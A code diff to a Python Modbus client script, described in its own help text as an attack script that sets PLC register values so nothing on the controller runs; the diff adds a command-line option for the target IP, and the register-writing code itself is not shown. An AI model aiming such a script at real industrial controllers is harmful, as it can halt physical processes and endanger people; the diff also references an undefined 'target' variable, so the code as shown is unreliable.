@@ -4,6 +4,37 @@ from pymodbus.client.sync import ModbusTcpClient as ModbusClient
 from pymodbus.exceptions import ConnectionException
 import logging
 
+import argparse
+import os
+import sys
+
+# Override Argument parser to throw error and generate help message
+# if undefined args are passed
+class MyParser(argparse.ArgumentParser):
+    def error(self, message):
+        sys.stderr.write('error: %s\n' % message)
+        self.print_help()
+        sys.exit(2)
+        
+# Create argparser object to add command line args and help option
+parser = MyParser(
+	description = 'This attack scripts sets register values so that nothing on the PLC will run',
+	epilog = '',
+	add_help = True)
+	
+# Add a "-i" argument to receive a filename
+parser.add_argument("-t", action = "store", dest="target",
+					help = "Target modbus IP address")
+
+# Print help if no args are supplied
+if len(sys.argv)==1:
+	parser.print_help()
+	sys.exit(1)
+
+# Split and process arguments into "args"
+args = parser.parse_args()
+
+
 logging.basicConfig()
 log = logging.getLogger()
 log.setLevel(logging.INFO)
@@ -11,7 +42,7 @@ log.setLevel(logging.INFO)
 #####################################
 # Code
 #####################################
-client = ModbusClient('localhost', port=5020)
+client = ModbusClient(target, port=5020)
 
 try:
     client.connect()
